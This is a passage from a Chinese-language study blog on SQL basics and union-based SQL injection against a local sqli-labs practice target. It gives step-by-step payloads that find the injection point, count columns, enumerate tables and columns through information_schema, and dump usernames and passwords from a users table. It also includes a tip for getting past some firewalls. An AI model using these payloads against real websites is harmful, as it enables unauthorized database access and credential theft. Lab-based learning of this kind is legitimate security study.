class="line"><span class="keyword">SET</span> column1 <span class="operator">=</span> value1, column2 <span class="operator">=</span> value2, ...</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br></pre></td></tr></table></figure><p>删除数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br></pre></td></tr></table></figure><p>连接表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">JOIN</span> table2 <span class="keyword">ON</span> table1.column <span class="operator">=</span> table2.column;</span><br></pre></td></tr></table></figure><p>排序数据：</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> column1 ASC/DESC;</span><br></pre></td></tr></table></figure><p>聚合函数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="keyword">column</span>) <span class="keyword">FROM</span> table_name;  <span class="comment">-- 计算行数</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUM</span>(<span class="keyword">column</span>) <span class="keyword">FROM</span> table_name;  <span class="comment">-- 求和</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">AVG</span>(<span class="keyword">column</span>) <span class="keyword">FROM</span> table_name;  <span class="comment">-- 平均值</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">MAX</span>(<span class="keyword">column</span>) <span class="keyword">FROM</span> table_name;  <span class="comment">-- 最大值</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">MIN</span>(<span class="keyword">column</span>) <span class="keyword">FROM</span> table_name;  <span class="comment">-- 最小值</span></span><br></pre></td></tr></table></figure><h2 id="SQL注入五部曲"><a href="#SQL注入五部曲" class="headerlink" title="SQL注入五部曲"></a>SQL注入五部曲</h2><h3 id="1-查找注入点"><a href="#1-查找注入点" class="headerlink" title="1.查找注入点"></a>1.查找注入点</h3><p>例如，我们找的的注入点是?id&#x3D;1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.160.128/sql/Less-1/?id=1</span><br></pre></td></tr></table></figure><h3 id="2-判断是字符型还是数字型注入-and1-1-1-2-3-1"><a href="#2-判断是字符型还是数字型注入-and1-1-1-2-3-1" class="headerlink" title="2.判断是字符型还是数字型注入 and1&#x3D;1 1&#x3D;2&#x2F;3-1"></a>2.判断是字符型还是数字型注入 and1&#x3D;1 1&#x3D;2&#x2F;3-1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.160.128/sql/Less-1/?id=1 and 1=1</span><br></pre></td></tr></table></figure><h3 id="3-如果字符型，找到他的闭合方式，’、”、’-、”"><a href="#3-如果字符型，找到他的闭合方式，’、”、’-、”" class="headerlink" title="3.如果字符型，找到他的闭合方式，’、”、’)、”)"></a>3.如果字符型，找到他的闭合方式，’、”、’)、”)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.160.128/sql/Less-1/?id=1&#x27;--+</span><br></pre></td></tr></table></figure><h3 id="4-判断查询列数-group-by、orderby"><a href="#4-判断查询列数-group-by、orderby" class="headerlink" title="4.判断查询列数 group by、orderby"></a>4.判断查询列数 group by、orderby</h3><p>利用group by或者order by x，用二分法缩小范围</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.160.128/sql/Less-1/?id=1&#x27; group by 3--+</span><br></pre></td></tr></table></figure><h3 id="5-查询回显位置，-1"><a href="#5-查询回显位置，-1" class="headerlink" title="5.查询回显位置，-1"></a>5.查询回显位置，-1</h3><p> 此时回显位就是2，3 然后我们可以在2，3上进行sql的代码注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.160.128/sql/Less-1/?id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure><h2 id="利用SQL语句进行数据库查找"><a href="#利用SQL语句进行数据库查找" class="headerlink" title="利用SQL语句进行数据库查找"></a>利用SQL语句进行数据库查找</h2><h3 id="1-查找数据库表名信息"><a href="#1-查找数据库表名信息" class="headerlink" title="1.查找数据库表名信息"></a>1.查找数据库表名信息</h3><p><img src="/./sql%E6%B3%A8%E5%85%A5/image-20231124235921355.png" alt="image-20231124235921355"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0&#x27; union select 1,2,table_name from information_schema.tables --+</span><br></pre></td></tr></table></figure><p>当然这个表是海量的，其中我们获取的table_name是下面图片的第三列，TABLE_SCHEMA是我们当前数据库对应的名字</p><p><img src="/./sql%E6%B3%A8%E5%85%A5/image-20231125000447901.png" alt="image-20231125000447901"></p><p><img src="/./sql%E6%B3%A8%E5%85%A5/image-20231125000720512.png" alt="image-20231125000720512"></p><p>为了查询我们需要的数据库下的表名，我们需要限定范围，有些防火墙加入database()更好绕过一些</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0&#x27; union select 1,2,table_name from information_schema.tables where table_schema = database() --+</span><br></pre></td></tr></table></figure><h3 id="2-group-concat-的作用"><a href="#2-group-concat-的作用" class="headerlink" title="2.group_concat()的作用"></a>2.group_concat()的作用</h3><p>确保所有查询的信息能放到一行显示出来</p><p><img src="/./sql%E6%B3%A8%E5%85%A5/image-20231125001442029.png" alt="image-20231125001442029"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database() --+</span><br></pre></td></tr></table></figure><h3 id="3-查找数据库中数据表的列名"><a href="#3-查找数据库中数据表的列名" class="headerlink" title="3.查找数据库中数据表的列名"></a>3.查找数据库中数据表的列名</h3><p>所需要信息在数据库information_schema数据表columns数据列column_name</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema = database() --+</span><br></pre></td></tr></table></figure><p><img src="/./sql%E6%B3%A8%E5%85%A5/image-20231125002150571.png" alt="image-20231125002150571"></p><p>但此时列名也是有很多，但我们只想要<strong>数据表users</strong>里的名列名，因此我们加一点限制条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema = database()and table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="/./sql%E6%B3%A8%E5%85%A5/image-20231125002414590.png" alt="image-20231125002414590"></p><h3 id="4-查询最终目标"><a href="#4-查询最终目标" class="headerlink" title="4.查询最终目标"></a>4.查询最终目标</h3><p>查询语句  select列名+from表名+where限定语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0&#x27; union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users --+</span><br></pre></td></tr></table></figure><p><img src="/./sql%E6%B3%A8%E5%85%A5/image-20231125002720834.png" alt="image-20231125002720834"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
